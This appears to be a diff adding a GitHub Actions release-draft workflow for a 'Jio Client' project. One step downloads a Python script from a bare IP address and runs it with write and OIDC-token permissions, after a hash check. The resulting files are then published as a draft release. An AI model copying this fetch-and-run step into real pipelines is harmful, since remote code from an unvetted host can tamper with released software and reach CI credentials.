@@ -1,0 +1,43 @@
+name: Trusted release draft
+
+on:
+  workflow_call:
+
+permissions:
+  contents: write
+  id-token: write
+
+jobs:
+  draft:
+    if: github.repository == 'jiovannish/client' && startsWith(github.ref, 'refs/tags/v')
+    runs-on: ${{ fromJSON(vars.CI_RUNNER_LABELS || '["ubuntu-22.04"]') }}
+    timeout-minutes: 5
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - name: Download and verify this run's bundles from owned storage
+        run: |
+          evidence_tool="$RUNNER_TEMP/ci-evidence.py"
+          curl --fail --silent --show-error --retry 2 https://46.105.119.217:8443/tools/evidence-ac934fd48667de8aea96aa462dd11dfce0e007808fa9874bdccc8dfc62b20f96.py -o "$evidence_tool"
+          ci_python=python3
+          if [ "$RUNNER_OS" = Windows ]; then ci_python=python; fi
+          "$ci_python" -c 'import hashlib,pathlib,sys; assert hashlib.sha256(pathlib.Path(sys.argv[1]).read_bytes()).hexdigest() == sys.argv[2]' "$evidence_tool" ac934fd48667de8aea96aa462dd11dfce0e007808fa9874bdccc8dfc62b20f96
+          "$ci_python" "$evidence_tool" download --output dist --previous-attempts
+      - name: Create a draft for review
+        env:
+          GH_TOKEN: ${{ github.token }}
+          GH_REPO: ${{ github.repository }}
+          RELEASE_TAG: ${{ github.ref_name }}
+        run: |
+          version=$(sed -n 's/^    version=//p' install.sh)
+          test "$RELEASE_TAG" = "v$version"
+          cp install.sh install.ps1 dist/
+          cd dist
+          test "$(find . -name 'jio-*.tar.gz' | wc -l)" -eq 4
+          test "$(find . -name 'jio-*.zip' | wc -l)" -eq 1
+          sha256sum jio-*.tar.gz jio-*.zip install.sh install.ps1 > SHA256SUMS
+          gh release create "$RELEASE_TAG" --verify-tag --draft \
+            --title "Jio Client $RELEASE_TAG" \
+            --notes-file ../.github/release-notes.md \
+            jio-*.tar.gz jio-*.zip install.sh install.ps1 SHA256SUMS
